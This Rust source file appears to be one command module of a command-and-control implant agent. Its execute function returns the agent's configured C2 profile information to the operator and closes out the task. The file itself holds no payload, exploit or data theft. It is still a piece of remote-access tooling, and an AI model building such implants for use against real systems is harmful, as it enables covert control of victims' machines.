use crate::profiles;
use crate::structs::Task;

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    response.user_output = profiles::get_all_c2_info();
    response.completed = true;
    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
